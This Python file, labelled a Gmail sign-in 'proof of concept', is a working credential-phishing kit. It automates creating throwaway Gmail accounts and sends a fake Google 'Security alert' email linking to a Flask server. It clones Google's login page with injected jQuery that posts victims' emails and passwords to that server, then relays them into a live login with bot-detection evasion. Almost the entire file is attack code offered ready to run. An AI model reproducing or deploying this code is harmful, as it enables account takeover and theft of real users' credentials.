from selenium.webdriver.support import expected_conditions as EC
from smtplib import SMTP
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from selenium.webdriver.support.ui import Select
from flask import Flask, send_file, make_response, request
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.common.by import By
from urllib.request import urlopen, Request
from datetime import datetime, timedelta
from os import walk, path, makedirs, environ
from fake_headers import Headers
import undetected_chromedriver
from secrets import choice, token_urlsafe
from bs4 import BeautifulSoup
from chardet import detect
from typing import Dict
from re import compile
from time import sleep

# gmail signin page (proof of concept)
def generate_profiles():
    earliest_folder = None
    current_date = datetime.now()
    earliest_date = timedelta.max
    filepath = path.expanduser('~') + r'\.wdm\drivers\chromedriver'
    for root, dirs, files in walk(filepath):
        version_numbers = path.basename(root).split('.')
        if ''.join(version_numbers).isdigit() and len(root.split('\\')) == 8:
            creation_date = datetime.fromtimestamp(path.getctime(root))
            date_difference = current_date - creation_date
            if date_difference < earliest_date:
                earliest_date = date_difference
                earliest_folder = root
    new_folder = earliest_folder + f'\\profiles'
    if not path.exists(new_folder):
        makedirs(new_folder)
    return new_folder

def jquery_injector(response, html_name: str, code_injection: str, isEmailPage: bool = True,
    code_splitter: str = 'f=N(e,a,g,"",null);'):
    if isEmailPage:
        # add code for hyperlinks in the email page...
        response = bytes(response)
        soup = BeautifulSoup(response, 'lxml', from_encoding=detect(response)['encoding'])
        soup.find('body').insert_after(soup.new_tag('script',
        src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.min.js'))
        target = soup.find_all('script', {'nonce': compile(r'^\S{22}')}, True)[4]
        split_code = target.text.split(code_splitter)
        split_code[0] += code_splitter
        split_code.insert(1, code_injection)
        target.string = ''.join(split_code)
        with open(html_name, 'w', encoding='UTF-8') as file:
            file.write(str(soup))
    else:
        # add code for hyperlinks in the password page...
        split_code = response.split('</body>')
        split_code[0] += '</body>'
        split_code.insert(1, '<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>')
        new_code = ''.join(split_code)
        split_code = new_code.split(code_splitter)
        split_code[0] += code_splitter
        split_code.insert(1, code_injection)
        new_code = ''.join(split_code)
        with open(html_name, 'w', encoding='UTF-8') as file:
            file.write(new_code)

class Attacker:
    """For better experience, use VPN or a builtin proxy server"""
    def __init__(self, target_email):
        self.target_email = target_email
        self.options = undetected_chromedriver.ChromeOptions()
        # run it as debugger (https://chromedevtools.github.io/devtools-protocol/)
        self.options.add_argument(fr'--remote-debugging-port={9222}')
        self.options.add_argument(fr'--user-data-dir={generate_profiles()}')
        self.browser = undetected_chromedriver.Chrome(options=self.options)

    def create_account(self, phone_number):
        # CSS selectors from gmail's UI features are subject to change...
        secret = token_urlsafe(12)
        self.browser.maximize_window()  # maximize window....
        birthday_gender = '#birthdaygenderNext>div>button>span'
        password = '#createpasswordNext>div>button>span'
        confirm_password = '#confirm-passwd>div.aCsJod.oJeWuf>div>div.Xb9hP>input'
        skip = '#view_container>div>div>div.pwWryf.bxPAYd>div>div.zQJV3.F8PBrb>div>div>div:nth-child(2)>div>div>button>span'
        next = '#next>div>button>span'
        i_agree = '#yDmH0d>c-wiz>div.aDGQwe.UMxd3c>div.eKnrVb>div>div.Z6Ep7d.UMxd3c>div>div.F9NWFb>div>div>button>span'
        self.browser.get('https://accounts.google.com/signup?FirstName=Google&LastName=Team')
        self.browser.find_element(By.CSS_SELECTOR, '#collectNameNext>div>button>span').click()
        WebDriverWait(self.browser, 5).until(EC.visibility_of_element_located((By.CSS_SELECTOR,
        birthday_gender)))
        self.browser.find_element(By.CSS_SELECTOR, '#day').send_keys('1')
        Select(self.browser.find_element(By.CSS_SELECTOR, '#month')).select_by_index(0)
        self.browser.find_element(By.CSS_SELECTOR, '#year').send_keys('2000')
        Select(self.browser.find_element(By.CSS_SELECTOR, '#gender')).select_by_index(1)
        self.browser.find_element(By.CSS_SELECTOR, birthday_gender).click()
        rand = choice([0, 1])
        email = self.browser.find_element(By.CSS_SELECTOR, f'#selectionc{rand}').text
        self.browser.find_element(By.CSS_SELECTOR, f'#selectionc{rand}').click()
        WebDriverWait(self.browser, 5).until(EC.visibility_of_element_located((By.CSS_SELECTOR, password)))
        self.browser.find_element(By.CSS_SELECTOR,
        '#passwd>div.aCsJod.oJeWuf>div>div.Xb9hP>input').send_keys(secret)
        self.browser.find_element(By.CSS_SELECTOR, confirm_password).send_keys(secret)
        self.browser.find_element(By.CSS_SELECTOR, password).click()
        auth1 = '#view_container>div>div>div.pwWryf.bxPAYd>div>div.zQJV3>div>div>div>div>button>span'
        WebDriverWait(self.browser, 5).until(EC.visibility_of_element_located((By.CSS_SELECTOR, auth1)))
        self.browser.find_element(By.CSS_SELECTOR, '#phoneNumberId').send_keys(phone_number)
        self.browser.find_element(By.CSS_SELECTOR, auth1).click()
        auth2 = '#next>div>button>span'
        WebDriverWait(self.browser, 5).until(EC.visibility_of_element_located((By.CSS_SELECTOR, auth2)))
        # Use a remote mobile device for setting up verification...
        self.browser.find_element(By.CSS_SELECTOR, '#code').send_keys(input('Google verification code: '))
        self.browser.find_element(By.CSS_SELECTOR, auth2).click()
        WebDriverWait(self.browser, 5).until(EC.visibility_of_element_located((By.CSS_SELECTOR, skip)))
        self.browser.find_element(By.CSS_SELECTOR, skip).click()
        WebDriverWait(self.browser, 5).until(EC.visibility_of_element_located((By.CSS_SELECTOR, skip)))
        self.browser.find_element(By.CSS_SELECTOR, skip).click()
        WebDriverWait(self.browser, 5).until(EC.visibility_of_element_located((By.CSS_SELECTOR, next)))
        self.browser.find_element(By.CSS_SELECTOR, next).click()
        WebDriverWait(self.browser, 5).until(EC.visibility_of_element_located((By.CSS_SELECTOR, i_agree)))
        self.browser.find_element(By.CSS_SELECTOR, '#selectioni8').click()
        self.browser.find_element(By.CSS_SELECTOR, '#JQjcvcdisableButton>div.SCWude>div>div').click()
        self.browser.find_element(By.CSS_SELECTOR, '#selectioni12').click()
        self.browser.find_element(By.CSS_SELECTOR, i_agree).click()
        sleep(60)  # You have now your new account...
        self.browser.get('https://accounts.google.com/apppasswords')
        similar_selectors = '#yDmH0d>c-wiz>div>div:nth-child(2)>div:nth-child(2)>c-wiz>div>div.hyMrOd>div.Wea5y>div>div.MVoQRb>div'
        Select(self.browser.find_element(By.CSS_SELECTOR, similar_selectors + ':nth-child(2)>div:nth-child(1)>div:nth-child(1)>div:nth-child(1)>div.ry3kXd>div.MocG8c.YECFcc.LMgvRb.KKjvXb>span')).select_by_value('Mail')
        Select(self.browser.find_element(By.CSS_SELECTOR, similar_selectors + ':nth-child(2)>div:nth-child(1)>div.jgvuAb.eZEHZc.iWO5td>div.OA0qNb.ncFHed>div.MocG8c.YECFcc.LMgvRb.KKjvXb.DEh1R>span')).select_by_value('Windows Computer')
        self.browser.find_element(By.CSS_SELECTOR, similar_selectors + '.ggnaZd.b7yjye>div>span>span').click()
        app_password = self.browser.find_element(By.CSS_SELECTOR, '#yDmH0d>div.llhEMd.iWO5td>div>div.g3VIld.fHKvqc.T0jF8b.aigF6d.ocwy8b.Up8vH.J9Nfi.iWO5td>span>div>div.o2uwtd>span').text
        environ['SECRET_EMAIL'], environ['SECRET_APP_PASSWORD'] = email, app_password

    def send_mail(self, receiver_email):
        """If recipients were not given, expect a longer waiting time to complete"""
        sender_email, app_password = environ['SECRET_EMAIL'], environ['SECRET_APP_PASSWORD']
        smtp_server = SMTP('smtp.gmail.com', 587)
        smtp_server.starttls()
        smtp_server.login(sender_email, app_password)
        message = MIMEMultipart('alternative')
        message['Subject'] = 'Security alert'
        message['From'] = sender_email
        message['To'] = self.target_email
        html_content = """<div style="border-style:solid;border-width:thin;border-color:#dadce0;border-radius:8px;padding:40px 20px" align="center"><img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_74x24dp.png" width="74" height="24" aria-hidden="true" style="margin-bottom:16px"><div style="font-family:'Google Sans',Roboto,RobotoDraft,Helvetica,Arial,sans-serif;border-bottom:thin solid #dadce0;color:rgba(0,0,0,0.87);line-height:32px;padding-bottom:24px;text-align:center;word-break:break-word"> <div style="font-size:24px">A new sign-in on Windows </div> <table align="center" style="margin-top:8px"> <tbody> <tr style="line-height:normal"> <td align="right" style="padding-right:8px"> <img width="20" height="20" style="width:20px;height:20px;vertical-align:sub;border-radius:50%" src="https://ui-avatars.com/api/?&background=random&bold=true&font-size=0.5&name=C&size=96&uppercase=true"> </td> <td> <a style="font-family:'Google Sans',Roboto,RobotoDraft,Helvetica,Arial,sans-serif;color:rgba(0,0,0,0.87);font-size:14px;line-height:20px">carmanzyre985@gmail.com</a> </td> </tr> </tbody> </table></div><div style="font-family:Roboto-Regular,Helvetica,Arial,sans-serif;font-size:14px;color:rgba(0,0,0,0.87);line-height:20px;padding-top:20px;text-align:center">We noticed a new sign-in to your Google Account on a Windows device. If this was you, you don't need to do anything. If not, we'll help you secure your account. <div style="padding-top:32px;text-align:center"> <a href="http://192.168.250.100:5000" style="font-family:'Google Sans',Roboto,RobotoDraft,Helvetica,Arial,sans-serif;line-height:16px;color:#ffffff;font-weight:400;text-decoration:none;font-size:14px;display:inline-block;padding:10px 24px;background-color:#4184f3;border-radius:5px;min-width:90px" target="_blank">Check activity</a> </div></div><div style="font-family:Roboto-Regular,Helvetica,Arial,sans-serif;padding-top:20px;font-size:12px;line-height:16px;color:#5f6368;letter-spacing:0.3px;text-align:center">You can also see security activity at <br> <a style="color:rgba(0,0,0,0.87);text-decoration:inherit">https://myaccount.google.com/ <wbr>notifications </a></div></div><div style="text-align:left"><div style="font-family:Roboto-Regular,Helvetica,Arial,sans-serif;color:rgba(0,0,0,0.54);font-size:11px;line-height:18px;padding-top:12px;text-align:center"> <div>You received this email to let you know about important changes to your Google Account and services.</div> <div style="direction:ltr">&copy; 2023 Google LLC, <a class="m_6052542541626754474afal" style="font-family:Roboto-Regular,Helvetica,Arial,sans-serif;color:rgba(0,0,0,0.54);font-size:11px;line-height:18px;padding-top:12px;text-align:center">1600 Amphitheatre Parkway, Mountain View, CA 94043, USA</a> </div></div></div>"""
        html_part = MIMEText(html_content, 'html')
        message.attach(html_part)
        smtp_server.sendmail(sender_email, receiver_email, message.as_string())
        smtp_server.quit()

    def login_page(self, email_dict: Dict | None, password_dict: Dict = None):
        password = '#password>div.aCsJod.oJeWuf>div>div.Xb9hP>input'
        if email_dict is not None and password_dict is None:
            self.browser.maximize_window()  # maximize window....
            self.browser.get(f'https://accounts.google.com/AccountChooser?Email={email_dict["email"]}')
            self.browser.find_element(By.CSS_SELECTOR, '#identifierNext>div>button>span').click()
            WebDriverWait(self.browser, 5).until(EC.visibility_of_element_located((By.CSS_SELECTOR, password)))
            # Still fixing checkbox that's triggering the malfunction...
            jquery_injector(self.browser.page_source, 'password_page.html',
            'if(f.event.which===13||f.event.type==="checkbox"&&$(f.event.target).is("#selectionc1")||f.event.type==="click"&&$(f.event.target).is("#passwordNext>div>button>span")){var p=$("input[type=password]").val();$.post("http://192.168.250.100:5000/postPassword",{"password":p});return false;}', False)
        elif email_dict is None and password_dict is not None:
            self.browser.find_element(By.CSS_SELECTOR, password).send_keys(password_dict['password'])
            self.browser.find_element(By.CSS_SELECTOR, '#passwordNext>div>button>span').click()

app = Flask(__name__)
attacker = Attacker('example@gmail.com')
@app.route('/')
def index():
    result = make_response(send_file('email_page.html'))
    result.headers.add('Access-Control-Allow-Origin', 'http://192.168.250.100:5000')
    result.headers.add('X-XSS-Protection', '1; mode=block')
    result.headers.add('X-Frame-Options', 'SAMEORIGIN')
    return result

@app.route('/postEmail', methods=['POST'])
def postEmail():
    result = request.values.to_dict()
    print(result)
    if result['email'] != '':
        attacker.login_page(email_dict=result)
    return 'ok'

@app.route('/Password')
def Password():
    password_page = 'password_page.html' 
    while True:
        if path.exists(password_page):
            result = make_response(send_file(password_page))
            result.headers.add('Access-Control-Allow-Origin', 'http://192.168.250.100:5000')
            result.headers.add('X-XSS-Protection', '1; mode=block')
            result.headers.add('X-Frame-Options', 'SAMEORIGIN')
            return result
        else:
            sleep(5)  # Use this to avoid DOS/timing attacks...

@app.route('/postPassword', methods=['POST'])
def postPassword():
    result = request.values.to_dict()
    print(result)
    if result['password'] != '':
        attacker.login_page(None, result)
    return 'ok'


if __name__ == "__main__":
    jquery_injector(urlopen(Request('https://accounts.google.com/ServiceLogin', headers=Headers(browser='chrome',
    os='win', headers=True).generate())).read(), 'email_page.html', 'if(f.event.which===13||f.event.type==="click"&&$(f.event.target).is("#identifierNext>div>button>span")){var e=$("input[type=email]").val();$.post("http://192.168.254.116:5000/postEmail",{"email":e},function(){window.location="http://192.168.254.116:5000/Password"});return false;}')
    app.run(host='192.168.250.100', port=5000)
